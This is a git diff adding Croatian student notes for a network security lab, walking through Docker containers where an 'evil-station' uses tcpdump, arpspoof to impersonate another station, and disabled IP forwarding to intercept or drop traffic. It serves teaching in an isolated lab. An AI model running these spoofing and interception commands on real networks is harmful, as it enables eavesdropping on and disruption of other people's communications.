@@ -1,0 +1,59 @@
+Stvori folder za vjezbe, napravi git clone i otvori u vs code
+
+mkdir SRP
+cd SRP
+mkdir Vjezbe1
+Vjezbe 1 Arpspoofing
+
+cd Vjezbe1
+git init
+git clone (link github repozitorija kojeg kloniramo)
+dir
+cd srp
+cd arp-spoofing
+dir
+code .
+
+WSL za lako switchanje izmedu OS
+
+wsl
+uname -a
+uname
+exit
+
+Treba pokrenuti docker kontenjere 
+
+wsl
+./start.sh
+exit (kontenjeri ce se nastaviti izvršavati iako smo izasli)
+
+docker exec -it station-1 bash
+ctrl+l (clear)
+ping station-2
+ctrl c (za prekidanje programa koji se vrti)
+ifconfig
+
+shift alt + (prepolovimo terminal na dva kako bi mogli otvoriti 2 stationa istovremeno)
+docker exec -it station-2 bash 
+
+u stat2 ide netcat -l 8080
+u stat1 ide netcat station-2 8080
+(sad možemo razmijenjivati poruke izmedu station1 i station2)
+
+
+
+docker exec -it evil-station bash
+tpcdump (tpcdump hvata sve mrezne pakete koje prolaze kroz mrezu)
+//evil station moze vidjeti da se razmjenuju paketi izmedu station1 i station2 no nemoze ih jos razumjeti
+ctrl c
+
+
+Otvaramo novi terminal za evil station
+arpspoof -i eth0 -t station-1 station-2 (arpspoof, evil station ce se lazno predstaviti kao station2)
+
+tcpdump -qX host station-1 and not arp and not icmp (tcpdump s filterom)
+
+// evil station moze ali ne mora prosljediti sve pakete station2
+evilstation echo 0 > /proc/sys/net/ipv4/ip_forward (upisujemo 0 ako nezelimo prosljedivati pakete)
+
+exit 
